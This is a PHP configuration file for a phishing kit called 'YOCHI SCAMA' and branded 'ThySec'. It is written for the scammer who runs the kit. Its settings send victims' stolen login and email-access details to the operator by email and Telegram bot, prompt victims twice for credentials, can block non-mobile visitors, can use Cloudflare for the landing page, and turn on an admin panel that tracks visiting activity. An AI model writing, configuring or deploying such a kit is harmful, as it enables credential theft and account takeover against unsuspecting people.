<?php
###########################################################################################################
# <------- YOCHI SCAMA CONFIGURATION FILE <></>
/*
TOGGLE ON / OFF:
1 : ENABLE.
0 : DISABLE.
USE 1 OR 0 to SET FEATURES ON OR OFF*/

$mobileonly=0;                     # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
$createfolderpersession=0;         # <--- CREATE A NEW FOLDER FOR EACH SESSION
$usecaution=0;                     # <--- INDICATE WHETHER YOU WANT TO USE CAUTION OR NOT	
$ftpsave=0;                        # <--- SAVE RESULTS ON SCAMAHOMEFOLDER/rst/.....
$sendtoemail=1;                    # <--- SEND RESULTS TO EMAIL
$sendtotg=1;                       # <--- SEND RESULTS TO TELEGRAM
$doubleloginentry=1;               # <--- REQUEST TWICE FOR LOGIN DETAILS
$confirmemaillog=1;                # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
$cloudflarelanding=0;              # <--- USE CLOUDFLARE FOR LANDING PAGE
$send = "youremail@domain.yes,";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
$tgbot = "Your BOT TOKEN";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid = "CHAT_ID";                 # <--- YOUR TELEGRAM CHAT ID
$resultheading = "🎌 ThySec 🎌";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
$adminpass = "";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
// goto yourdomain.com/admin/index.php to track visiting activity
/* 


████████╗██╗  ██╗██╗   ██╗███████╗███████╗ ██████╗
╚══██╔══╝██║  ██║╚██╗ ██╔╝██╔════╝██╔════╝██╔════╝
   ██║   ███████║ ╚████╔╝ ███████╗█████╗  ██║     
   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔══╝  ██║     
   ██║   ██║  ██║   ██║   ███████║███████╗╚██████╗
   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝


	If you experience any issues or for upgrade
									   */
?>